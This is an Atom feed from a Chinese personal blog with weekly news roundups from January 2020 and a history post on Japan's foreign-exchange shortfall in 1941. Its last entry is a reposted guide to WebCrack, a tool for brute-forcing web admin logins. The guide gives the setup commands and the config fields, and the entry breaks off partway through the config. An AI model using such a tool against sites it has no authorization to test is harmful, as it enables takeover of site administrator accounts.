<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>治部少辅</title>
  
  <subtitle>大一大万大吉</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.codewoody.com/"/>
  <updated>2020-01-17T13:16:57.389Z</updated>
  <id>http://www.codewoody.com/</id>
  
  <author>
    <name>治部少辅</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Weekly-30</title>
    <link href="http://www.codewoody.com/posts/16684/"/>
    <id>http://www.codewoody.com/posts/16684/</id>
    <published>2020-01-15T03:26:40.000Z</published>
    <updated>2020-01-17T13:16:57.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新闻">新闻</h2><h3 id="中美签署贸易战第一阶段协议">中美签署贸易战第一阶段协议</h3><p>这意味着近两年来拖累全球经济的贸易战暂告一个段落，而美国对大部分中国输美商品加征的关税则维持不变。周三在白宫签署所谓的第一阶段协议之前，漫长的美中经贸冲突曾引发全球市场焦虑，并给企业带来不确定性。</p><p>协议全文 94 页（<a href="http://103.78.124.74:81/2Q2W191F46ABF384979D28B01DEDE17C6AF9E671666B_unknown_4F327C5A68A8BAAC21C97C814446427060F434D5_4/images.mofcom.gov.cn/www/202001/20200116104122611.pdf" target="_blank" rel="noopener">中</a>，<a href="https://assets.bwbx.io/documents/users/iqjWHBFdfxIU/rVaHxDBUtdew/v0" target="_blank" rel="noopener">英</a>），一些重点：</p><ul><li>前 16 页详细规定了保护知识产权的力度，对窃取商业机密行为作出刑事处罚。中国将在签署后 30 工作日内公布“增强知识产权保护的行动方案，以支持其高质量增长”。</li><li>双方不得以市场准入相关门槛、合营并购等投资行为，强迫另外一方转让技术。</li><li>2020-2021 年两年间，中国将从美国增加采购 2000 亿美元商品，包括 777 亿美元制造业商品、320 亿美元农产品、524 亿美元能源产品、379 亿美元服务业产品。增加是指在 2017 年贸易战爆发前基础上增加。</li><li>双方互加关税没有消除。去年年底宣布达成协议时暂停增加的<a href="https://www.qdaily.com/articles/64246.html" target="_blank" rel="noopener">惩罚性关税</a>将继续暂停下去——-原定 12 月 15 日，美国对 1600 亿美元中国产手机、电脑、玩具等商品增加关税、中国对美国产汽车等商品增加关税。此外美国自 9 月 1 日起对 1200 亿中国商品加税幅度减半至 7.5%。但大部分已经执行的加税（美对中 2500 亿、中对美 1100 亿）没有取消。</li></ul><p>协议覆盖了一些已经在早先宣布的内容，比如双方遵循 G20 期间宣布的不以价格竞争为目的而贬值货币的承诺、中国对外开放银行、保险、资产管理等金融市场。</p><p>特朗普现场称关税问题可以在第二阶段协议里一次性解决。刘鹤现场宣读中国国家主席习近平的信，敦促美国公平对待中国公司、保护双方大学等机构的持续合作。签约仪式和双方演讲有<a href="https://www.youtube.com/watch?v=3jA4rgUHgqA" target="_blank" rel="noopener">全程直播</a>。</p><p>欧盟(EU)贸易专员菲尔•霍根(Phil Hogan)批评美中“第一阶段”贸易协议提供的经济利益有限，暗示这主要是唐纳德•特朗普(Donald Trump)为赢得连任而采取的政治行动 ... 此外，一些国家担心，作为协议的一部分，中国采购2000亿美元美国商品，将使世界两个最大经济体之间展开“管理贸易”，这可能会无视市场力量、对两国企业不利、违反世界贸易组织(WTO)的承诺。<a href="http://www.ftchinese.com/story/001085983" target="_blank" rel="noopener">source</a></p><h3 id="中国经济数据">2019 中国经济数据</h3><h3 id="俄罗斯政府宣布全体辞职"><a href="https://www.dw.com/zh/%E4%BF%84%E6%94%BF%E5%BA%9C%E5%AE%A3%E5%B8%83%E5%85%A8%E4%BD%93%E8%BE%9E%E8%81%8C/a-52013402" target="_blank" rel="noopener">俄罗斯政府宣布全体辞职</a></h3><p>据俄罗斯通讯社报道，在普京总统发表年度国情咨文后，俄罗斯总理梅德韦杰夫宣布俄政府全体辞职。梅德韦杰夫表示，在俄罗斯总统普京宣布一系列宪法修改意见后，他告知普京，俄罗斯政府决定全体辞职。梅德韦杰夫说，普京总统的建议将对国家权力的平衡带来显著变化，政府以现在的形式辞职，以便总统可以采取所有必要措施。</p><p>俄罗斯国际文传通讯社援引梅德韦杰夫报道，普京将提名新的政府，并指示现内阁在此之前继续留任。该通讯社还报道，普京将任命梅德韦杰夫为俄罗斯联邦安全会议副主席，负责国防和安全。</p><p>1月15日早些时候，普京在国情咨文讲话中宣布，将在宪法改革中赋予议会更大的权力。议会今后将决定政府首脑以及重要的内阁成员。</p><blockquote><p>李建秋在之前的一篇文章里面就提到了梅德韦杰夫的问题。梅德韦杰夫作为自由派，在很多问题上优柔寡断，损害了俄罗斯的利益，下台是必然的。</p></blockquote><p>克里姆林宫表示，俄罗斯总统普京周三正式提名名不见经传的俄罗斯联邦税务局局长Mikhail Mishustin担任新总理。<a href="https://cn.reuters.com/article/russia-putin-mishustin-new-pm-0115-idCNKBS1ZE30K?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></p><h3 id="美军多人在伊朗导弹袭击中受伤">美军多人在伊朗导弹袭击中受伤</h3><p>1 月 8 日，伊朗为报复美国无人机袭击炸死圣城旅最高领导人苏莱曼尼准将，向美军在伊拉克的若干军事基地发动了导弹袭击。随后美国总统特朗普表示伊朗的导弹袭击没有导致任何美国人的伤亡，中东局势随之降温。不过近日新的消息显示，大约有 11 名美国士兵在伊朗的导弹袭击中受伤。<a href="https://www.reuters.com/article/us-iraq-security-usa-casualties/eleven-u-s-troops-injured-in-jan-8-iran-missile-attack-in-iraq-idUSKBN1ZG0AX" target="_blank" rel="noopener">source</a></p><h3 id="其他">其他</h3><h4 id="国内">国内</h4><ul><li>武汉发现的新型冠状病毒有人传人的风险，已向全球医院发出警告。<a href="https://cn.reuters.com/article/china-health-concern-who-0114-tues-idCNKBS1ZE01J?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>2019 年中国汽车的销量下降了 8.2%，至 2580 万辆。<a href="http://www.ftchinese.com/story/001085908" target="_blank" rel="noopener">source</a></li><li>中国海关总署发布数据，2019年，中美两国贸易额为5412.23亿美元，同比下降14.6%。<a href="http://sputniknews.cn/economics/202001141030443429/" target="_blank" rel="noopener">source</a></li><li>1 月 16 日，著名主持人赵忠祥去世。<a href="https://www.zhihu.com/question/366508914" target="_blank" rel="noopener">source</a></li><li>1 月 16 日，首家纯外资保险公司 安联中国在上海正式开业。</li><li>支持反送中的香港民间组织「国难中医」创建人被指在广州嫖娼被捕。这位化名”肥仔“的香港学生就读于广州中医药大学，“国难忠医”为一个志愿医务人员网。<a href="https://www.dw.com/zh/香港-国难忠医-创建人被指在广州嫖娼被捕/a-52031133?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>大陆总人口突破 14 亿人。国家统计局数据显示，截至2019年末，中国大陆总人口突破14亿人，为140005万人，比上年末增长467万人。</li><li>国家统计局 1 月 17 日对外宣布，经过初步核算，2019 年我国国内生产总值 (GDP) 为 99.0865万亿元，稳居世界第二位；人均GDP首次站上1万美元的新台阶。此前，全球人均GDP超过1万美元的经济体总人口近15亿。中国人均GDP突破1万美元，相当于人均GDP超过1万美元的世界人口翻了一番。</li></ul><h4 id="国际">国际</h4><ul><li>乌克兰客机遇害者所属国家将在伦敦开会讨论对伊朗此案去法律行动。<a href="https://cn.reuters.com/article/iran-crash-ukraine-exclusive-0113-mon-idCNKBS1ZD015?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>本周中美将签订贸易协议，在签订之前，美国财务部将摘掉中国汇率操纵国的标签。特朗普政府的一位官员暗示美方将采取上述行动。此举将逆转去年夏天美国政府将中国列为汇率操纵国的有争议决定；当时华盛顿和北京之间的紧张关系急剧升级。<a href="http://www.ftchinese.com/story/001085909" target="_blank" rel="noopener">source</a></li><li>位于拉合尔的巴基斯坦最高法院裁定审理前总统<a href="https://zh.wikipedia.org/zh-hans/%E4%BD%A9%E5%B0%94%E9%9F%A6%E5%85%B9%C2%B7%E7%A9%86%E6%B2%99%E6%8B%89%E5%A4%AB" target="_blank" rel="noopener">穆沙拉夫</a>的特别法院违宪，后者被判处死刑。<a href="http://sputniknews.cn/politics/202001141030442655/" target="_blank" rel="noopener">source</a></li><li>英国首相鲍里斯·约翰逊14日明确拒绝苏格兰要求于今年举行二次独立公投的要求，称二次公投会让苏格兰再度陷入政治僵局。<a href="http://www.bjd.com.cn/a/202001/15/WS5e1e8937e4b0e6e583938c98.html" target="_blank" rel="noopener">source</a></li><li>在武汉发现的不明肺炎在泰国曼谷发现首例境外感染者。<a href="http://www.bbc.com/zhongwen/simp/world-51116985" target="_blank" rel="noopener">source</a></li><li>日本厚生劳动省对外通报，日本国内发现首例感染新型病毒的肺炎患者病例。患者是一位居住在日本、此前曾前往过武汉的中国籍男子。<a href="https://www.dw.com/zh/日本现首例新型冠状病毒肺炎/a-52020515?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>丹麦地标小美人鱼像被喷上 Free Hong Kong 的口号。该雕像过往曾多次被涂鸦及损毁，更在1964年及1998年两次被“斩首”。<a href="http://www.bbc.com/zhongwen/simp/world-51116225" target="_blank" rel="noopener">source</a></li><li>据俄罗斯卫星网1月16日报道，车臣总统和政府网站上发布的命令称，车臣领导人拉姆赞·卡德罗夫13日签署文件任命车臣政府总理穆斯利姆·胡奇耶夫自1月13日起在他暂时丧失工作能力期间临时行使领导人职权。</li><li>美国要求台积电在大选前做好决定，是否前往美国生产芯片。</li></ul><h4 id="科技">科技</h4><ul><li>Google 将淘汰第三方Cookie。<a href="http://www.ftchinese.com/story/001085945" target="_blank" rel="noopener">source</a></li><li>微软正式终止支持 Windows 7。<a href="https://www.williamlong.info/archives/5949.html" target="_blank" rel="noopener">source</a></li><li>微软正式发布基于 Chromium 的浏览器 the New Microsoft Edge。拥有更快的速度、更低的内存占用，更多的隐私选项，支持 Windows 7、8、8.1、10 和 macOS，支持全部现有的 Chrome 扩展。<a href="https://www.appinn.com/the-new-microsoft-edge-base-chromium/" target="_blank" rel="noopener">source</a></li></ul><h2 id="言论">言论</h2><ul><li><p>如果还没想清楚，就用蛮力算法。 —— Ken Thompson</p></li><li><p>不要使用反正弦和反余弦函数——你总能用优美的恒等式，或者是计算向量点积来更好地解决问题。—— Jim Conyngha</p></li><li><p>在存储日期中的年份的时候，请使用四位数字。—— David Martin</p></li><li><p>避免使用不对称结构。—— Andy Huber</p></li><li><p>代码写的越急，程序跑得越慢。—— Roy Carlson</p></li><li><p>你用英语都写不出来的东西就别指望用代码写了。—— Peter Halpern</p></li><li><p>如果代码和注释不一致，那很可能两者都错了。—— Norm Schryer</p></li><li><p>如果你发现特殊情况太多，那你肯定是用错方法了。—— Carig Zerouni</p></li><li><p>先把数据结构搞清楚，程序的其余部分自现。—— David Jones</p></li><li><p>I don't care who does the electing, so long as I get to do the nominating. - <a href="https://en.wikiquote.org/wiki/William_M._Tweed" target="_blank" rel="noopener">William M. Tweed</a></p></li></ul><h2 id="文章">文章</h2><ul><li><a href="https://www.bbc.com/future/article/20170607-why-printers-add-secret-tracking-dots" target="_blank" rel="noopener">Why printers add secret tracking dots</a>。彩色打印机厂商会在页面上添加隐形标志，但是从不对外界透露。</li><li><a href="https://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api" target="_blank" rel="noopener">RESTful API 最佳实践</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;新闻&quot;&gt;新闻&lt;/h2&gt;
&lt;h3 id=&quot;中美签署贸易战第一阶段协议&quot;&gt;中美签署贸易战第一阶段协议&lt;/h3&gt;
&lt;p&gt;这意味着近两年来拖累全球经济的贸易战暂告一个段落，而美国对大部分中国输美商品加征的关税则维持不变。周三在白宫签署所谓的第一阶段协议之前，漫长的美中经贸
      
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-29</title>
    <link href="http://www.codewoody.com/posts/55277/"/>
    <id>http://www.codewoody.com/posts/55277/</id>
    <published>2020-01-07T04:33:09.000Z</published>
    <updated>2020-01-16T10:51:44.966Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新闻">新闻</h2><h3 id="蔡英文当选获得连任">蔡英文当选获得连任</h3><p><img src="https://imgs.codewoody.com/uploads/big/93b05a2c7a9935cc6df5ce26784451fc.jpg"></p><p>1月11日，台湾举行2020年总统选举与立法委员选举。现任总统蔡英文以超过817万票的成绩成功连任，创下台湾总统选举史上最高得票数。本次台湾总统选举投票率为74.9%，蔡英文得票率超过57%。她的另外两位对手，来自国民党的韩国瑜与亲民党的宋楚瑜则分别获得超过552万票与60万票。</p><p>中国国台办发言人11日在结果出炉后表示，北京坚持“和平统一、一国两制”方针，愿意在坚持“九二共识”，反对“台独”的共同政治基础上，推动和平统一进程。</p><p>蔡英文在胜选讲话中称，这次选举结果说明，台湾人“选择了民主和进步的价值，选择了改革和团结的道路”。</p><h3 id="南京邮电大学硕士在实验室自焚">南京邮电大学硕士在实验室自焚</h3><p>南京邮电大学1月5日发布情况通报：2019年12月26日晨，学校发现材料学院2017级一硕士研究生意外死亡。学校立即成立专门工作组，全力配合相关部门做好事件调查及家属安抚等善后工作。</p><p>对调查过程中反映出的该同学导师张某的相关问题，2020年1月1日，学校已依据相关规定，取消张某研究生导师资格，并根据学生意愿将张某指导的在读研究生全部转由其他导师指导，后续调查处理正在进行中。 有网友称，该学生被导师谩骂和压榨、人格侮辱、不给改论文、还被要求签延期毕业，因而选择结束生命。网传消息称，2019年12月26日凌晨，南京邮电大学实验室附近发生火灾，后发现火灾现场有一具尸体。</p><p>红星新闻记者通过天眼查发现，涉事导师张某名下现存两家公司，一家在南京，一家在长春。目前位于长春的公司显示为注销状态。张某分别为两家公司的法人和股东、监事。</p><h3 id="美伊冲突">美伊冲突</h3><ul><li>7 日，苏莱曼尼葬礼上发生踩踏事件，多人丧生。<a href="https://cn.reuters.com/article/iran-press-tv-soleimani-funeral-0107-idCNKBS1Z610W?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>7 日，特朗普收回之前的威胁内容，称他将遵守国际法规定，避免在军事打击中将文化遗址作为目标。<a href="https://cn.reuters.com/article/iraq-security-trump-cutural-sites-0108-idCNKBS1Z7051?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>7 日凌晨，驻扎在伊拉克的 120 名德国士兵中，32 名撤离伊拉克。<a href="https://www.dw.com/zh/32名德国士兵撤离伊拉克/a-51919328?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>美国国防部确认，7 日，至少两个美国驻伊拉克的军营被超过 10 枚导弹击中，伤亡情况目前未知。<a href="http://www.bbc.com/zhongwen/simp/world-51029691" target="_blank" rel="noopener">source</a>。革命卫队警告美国若就导弹袭击进行报复，将遭致新的回应。<a href="https://cn.reuters.com/article/iran-warning-0108-wedn-idCNKBS1Z70KI?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>8 日，一家乌克兰国际航空的波音 737-800 客机从德黑兰机场起飞后不久坠毁，机上 180 人恐无一生还。<a href="http://www.bbc.com/zhongwen/simp/world-51030121" target="_blank" rel="noopener">source</a>。RT的报道称，机场官员表示引擎起火导致了该乌克兰航班飞机坠毁。并且这一报道还提到，机上乘客大部分是伊朗人。<a href="https://www.rt.com/news/477693-engine-catching-fire-crash/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=RSS" target="_blank" rel="noopener">source</a></li><li>美国和加拿大怀疑伊朗导弹误击是导致乌克兰航班 737-800 坠毁的原因。<a href="https://www.dw.com/zh/美加怀疑伊朗导弹误击客机-德黑兰控心理战/a-51947796?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>众议院投票通过限制特朗普进攻伊朗的法案。<a href="https://www.rt.com/usa/477848-congress-iran-war-powers-vote/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=RSS" target="_blank" rel="noopener">source</a></li><li>9 日，特朗普表示，北约应该扩大在中东地区的军事存在<span class="foot-note-span">【不过北约在欧洲的主要国家对于本次特朗普去招惹伊朗基本态度比较负面，没有站出来为特朗普说话。特朗普想把北约拉下来趟这趟浑水是不太可能成功的。】</span>。<a href="http://sputniknews.cn/military/202001101030419786/" target="_blank" rel="noopener">source</a></li><li>9 日，伊拉克召见了伊朗大使，表示不接受袭击驻伊军事基地的做法，并将这一行为视为侵犯了伊拉克的主权。<a href="https://cn.reuters.com/article/iraq-security-iran-diplomacy-0109-idCNKBS1Z9015?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>11 日，伊朗方面承认意外击落乌克兰客机。<a href="http://www.bbc.com/zhongwen/simp/world-51073948" target="_blank" rel="noopener">source</a></li><li>伊朗爆发反哈梅内伊的游行，谴责政府就乌克兰坠机撒谎。<a href="http://www.bbc.com/zhongwen/simp/world-51081175" target="_blank" rel="noopener">source</a></li></ul><h3 id="其他">其他</h3><h4 id="国内">国内</h4><ul><li>1 月 9 日，中国自然资源部发布文件称，将全面向内外资企业开放油气勘探与开采的权限。该文件的正式名称为《关于推进矿产资源管理改革若干事项的意见（试行）》，将于今年5月1日生效。根据这个文件，在中国境内注册净资产不低于3亿人民币的国内外公司，均有资格取得油气矿业权。<a href="https://www.dw.com/zh/%E4%B8%AD%E5%9B%BD%E5%90%91%E5%A4%96%E4%BC%81%E7%A7%81%E4%BC%81%E5%BC%80%E6%94%BE%E6%B2%B9%E6%B0%94%E5%B8%82%E5%9C%BA/a-51942606?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>1 月 11 日，据中央纪律监督委员会周六（1月11日）公布的消息，中国国家开发银行原党委书记兼董事长胡怀邦因严重违法违纪被开除党籍。<a href="https://www.dw.com/zh/中国金融高官胡怀邦落马/a-51966821?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li></ul><h4 id="国际">国际</h4><ul><li>当地时间5日，委内瑞拉总统马杜罗政府接管委内瑞拉立法机构，宣示自己的候选人当选国民议会议长。</li><li>卡洛斯•戈恩被禁止离开黎巴嫩，在贝鲁特，法官加桑•奥瓦达特(Ghassan Owaidat)传召戈恩出庭，涉及国际刑警组织有过讯问和拘留他的非约束性请求，以及与他访问以色列有关的一起诉讼；按照黎巴嫩法律，访问以色列严格来说是非法的。。<a href="http://www.ftchinese.com/story/001085867" target="_blank" rel="noopener">source</a></li><li>美国众议长佩洛西不顾本党议员日益强烈的压力，重申她不会向参议院提交弹劾条款。佩洛西一直没有向参议院提交弹劾条款，此举意在向参议院共和党领袖米奇•麦康奈尔(Mitch McConnell)施压，要求在审理期间允许传唤新的证人和提交新的证据。<a href="http://www.ftchinese.com/story/001085866" target="_blank" rel="noopener">source</a></li><li>10 日，佩洛西表示民主党占多数席位的众议院最早将于下周向参议院提交针对总统特朗普的正式弹劾指控，为一场他期待已久的弹劾审判奠定基础。<a href="https://cn.reuters.com/article/us-house-pelosi-trump-impeachment-0111-idCNKBS1ZA01U?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>8 日，印度 10 个全国性工会组织宣称于当天组织了 2.5 亿人举行大罢工。据《今日印度》报道，工会要求政府取消对国企进行私有化等一系列“反工人阶级、反人民和反民族的政策”，指责劳工部门没能满足工人诉求，同时还谴责日前在尼赫鲁大学发生的暴力事件。<a href="http://www.nbd.com.cn/articles/2020-01-09/1399294.html" target="_blank" rel="noopener">source</a></li></ul><h4 id="科技">科技</h4><ul><li>估值40亿美元、被美国制裁的中国人脸识别技术企业旷视科技(Megvii)扫清了赴港上市的一大障碍，使其筹资额达5亿美元的首次公开发行(IPO)回归正轨。<a href="http://www.ftchinese.com/story/001085816" target="_blank" rel="noopener">source</a></li><li>7 日，特斯拉在上海的特斯拉超级工厂举行「中国制造 Model 3 首批社会车主交付仪式」，这是特斯拉第一次向社会用户大规模交付中国制造 Model 3，上海市各级政府领导、特斯拉首席执行官埃隆 · 马斯克，以及特斯拉中国管理团队出席了本次活动。<a href="https://sspai.com/post/58324" target="_blank" rel="noopener">source</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/93b05a2c7a9935cc6df5ce26784451fc.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>关于珍珠港事件前日本外汇枯竭的考证</title>
    <link href="http://www.codewoody.com/posts/49957/"/>
    <id>http://www.codewoody.com/posts/49957/</id>
    <published>2020-01-06T02:41:29.000Z</published>
    <updated>2020-01-16T10:50:48.931Z</updated>
    
    <content type="html"><![CDATA[<p>在日本偷袭珍珠港事件以前，日本大量从美国尽快必要的战争物资，尤其是石油。在珍珠港事件之前，美国开始执行对日本的物资禁运。很多人因此认为，如果日本不去作这个死，集中全力去解决中国问题，那么抗战胜负，未可知也。</p><p>但大多数普通人不知道的是，事实上到 1941 年日本的外汇储备已经枯竭。也就是说，即便美国不去制裁日本，日本也不会有钱去找美国购买至关重要的战略物资（如石油，橡胶等）。在这种情况下，日本铤而走险，抢占法国、荷兰在东南亚的殖民地以获取战略物资（例如法属印度支那的橡胶和婆罗洲的油田，还包括粮食、铁、有色金属等）就成了无可奈何的必然选择。日本的外汇枯竭，事实上是日本侵略中国导致国力日渐枯竭的后果。这篇文章主要就这一问题进行考证。</p><h2 id="外汇枯竭">外汇枯竭</h2><p>知乎上一个<a href="https://www.zhihu.com/question/284203566" target="_blank" rel="noopener">高赞回答</a>提到了这个问题。</p><blockquote><p>其实原因很明显：日本侵华亏惨了老本，经济濒临崩溃，购买石油、粮食等战略物资的能力已近于枯竭，到1941年，按美国驻日大使的说法，日本可用于支付的外汇只相当于2万德国马克。（约瑟夫。C。格鲁《使日十年》）</p></blockquote><blockquote><p>在中文网络上，搜索关于1941年日本外汇储备的情况也几乎都能追溯到这个引用。不过这个引用细究一下有点奇怪。作者约瑟夫·C·格鲁是美国驻日大使，日本政府的财政状况，他何以清楚呢？毕竟当年不是现在，日本政府、军部应该不会定期公开发布全面的财政报告。</p></blockquote><p><a href="https://book.douban.com/subject/1479333/" target="_blank" rel="noopener">《使日十年》(<i>Ten Years in Japan</i>)</a>，是 1932 年至 1942 年间担任美国驻日大使<a href="https://zh.wikipedia.org/wiki/%E7%BA%A6%E7%91%9F%E5%A4%AB%C2%B7%E6%A0%BC%E9%B2%81" target="_blank" rel="noopener">约瑟夫-C-格鲁(Joseph Clark Grew)</a>的日记及公私文件摘录。该书的英文原版可以在<a href="https://archive.org/details/TenYearsInJapan/page/n327" target="_blank" rel="noopener">这个链接</a>查看。在该链接中，<a href="https://archive.org/details/TenYearsInJapan/page/n399" target="_blank" rel="noopener">第399页</a>，章节 Frozen credits bring japan close to bankruptcy写道:</p><blockquote><p>October 9, 1941</p><p>According to information received by a member of my staff from what is regarded as a very reliable source, <strong>the amount of foreign exchange available to the Japanese Government now is approximately 20,000 reichsmarks</strong>, and under the circumstances the Japanese Government will be unable to avoid defaulting on contracts calling for foreign exchange on maturity. The freezing regulations which were put into effect by the United States, Great Britain, and the Netherlands East Indies have completely cut off any exchange transactions in the currencies of those countries, and in addition have greatly reduced transactions in the currencies of South American countries. According to this information, his own contracts involve foreign exchange totalling approximately five million Swedish kronen, and during recent months Japanese purchases of Swedish goods have been primarily financed through Berlin, persumably through German advanced credits.</p><p>The Japanese have been informed recently by the Germans that these credits are now frozen and are to used only to purchase of German goods. According to our informant it is possible that this action by the Germans was taken in anticipation of Japan's withdrawal from the Axis. According to another soure it is believed that since Sweden is heavily indebted to Germany for armaments, the Germans are now demanding in return from Sweden goods instead of Swedish kronen. Reports are current here that Japan is now eighty million marks in debt to Germany.</p><p>In actual fact Japan is now in virtually the same embarrassing position from the point of view of international finance as are designated foreigners in this country.</p></blockquote><p>这里，作者直接提到了，根据十分可靠的信息来源，日本政府的外汇储备大约是两万德国马克，日本将无力支付外汇合同。由美国，英国和荷兰东印度公司联合制定的冻结条款阻止了日本获得这些国家的货币储备，同时也削弱了日本和南美国家的交易。近几个月以来，日本和瑞士方面的价值五百万瑞士克朗的订单主要在依靠德国的贷款进行支付。不过近期德国告知日本方面日本的贷款也被冻结，而且贷款只能用于从德国购买商品。目前日本已经欠了德国大约八百万马克。这意味着日本的财政即将崩溃。</p><p>一些其他有意思的发现（下面的页码都是前面给出的英文原版链接中的页码）：</p><ol type="1"><li>第 326 页: 1941 年，大使已经听到了很多谈论日本将会对珍珠港发动大规模的突然袭击的说法，并且报告了政府。原文是: <i>There is a lot of talk around town to the effect that the Japanese, in case of a break with the United States, are planning to go all out in a surprise attack on Pearl Harbour. Of course I informed our Government.</i></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在日本偷袭珍珠港事件以前，日本大量从美国尽快必要的战争物资，尤其是石油。在珍珠港事件之前，美国开始执行对日本的物资禁运。很多人因此认为，如果日本不去作这个死，集中全力去解决中国问题，那么抗战胜负，未可知也。&lt;/p&gt;
&lt;p&gt;但大多数普通人不知道的是，事实上到 1941 年日本
      
    
    </summary>
    
    
      <category term="考证" scheme="http://www.codewoody.com/tags/%E8%80%83%E8%AF%81/"/>
    
      <category term="历史" scheme="http://www.codewoody.com/tags/%E5%8E%86%E5%8F%B2/"/>
    
  </entry>
  
  <entry>
    <title>[转载]网站后台爆破工具: WebCrack</title>
    <link href="http://www.codewoody.com/posts/28945/"/>
    <id>http://www.codewoody.com/posts/28945/</id>
    <published>2020-01-02T04:57:07.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇转载的文章。文章来源是：<a href="https://zhuanlan.zhihu.com/p/89205738" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89205738</a></p><h2 id="webcrack-简介">WebCrack 简介</h2><p>WebCrack 是一款开源免费的web后台弱口令/万能密码批量爆破、检测工具。</p><p>不仅支持如discuz，织梦，phpmyadmin等主流CMS的后台爆破，并且对于绝大多数小众CMS甚至个人开发网站后台都有效果，只需在工具中导入后台地址即可进行自动化检测。</p><h2 id="使用方法">使用方法</h2><h3 id="下载">下载</h3><p>GitHub 项目: <a href="https://github.com/yzddmr6/WebCrack" target="_blank" rel="noopener">https://github.com/yzddmr6/WebCrack</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/yzddmr6/WebCrack</span><br></pre></td></tr></table></figure><h3 id="安装所需依赖">安装所需依赖</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><h3 id="运行脚本">运行脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python webcrack.py </span></span><br><span class="line">*****************************************************</span><br><span class="line">*　　　　　　　　　　　　　　　　　　　　　　 　    * </span><br><span class="line">****************    Code By yzddMr6   ***************</span><br><span class="line">*　　　　　　　　　　　　　　　　　　　　　　 　    *</span><br><span class="line">*****************************************************</span><br><span class="line">File or Url:</span><br></pre></td></tr></table></figure><p>输入文件名则进行批量爆破，输入 URL 则进行单域名爆破。</p><h3 id="自定义配置">自定义配置</h3><p>在 <code>cms.json</code>里面可以进行自定义配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"这是cms的名称"</span>,</span><br><span class="line">    <span class="attr">"keywords"</span>: <span class="string">"这里是cms后台页面的关键字，是识别cms的关键"</span>,</span><br><span class="line">    <span class="attr">"captcha"</span>: <span class="string">"1 为后台有验证，0 为没有。因为此版本并没有处理验证码，所以为 1 则退出爆破"</span>,</span><br><span class="line">    <span class="attr">"exp_able"</span>: <span class="string">"是否启用万能密码模块爆破"</span>,</span><br><span class="line">    <span class="attr">"success_flag"</span>: <span class="string">"登录成功过后的关键字"</span>,</span><br><span class="line">    <span class="attr">"fail_flag"</span>: <span class="string">"请谨慎填写此项。如果填写此项，遇到里面的关键字就会退出爆破，用于 dz 等对于爆破有次数限制的cms"</span>,</span><br><span class="line">    <span class="attr">"alert"</span>: <span class="string">"若为 1 则会打印下面的 note 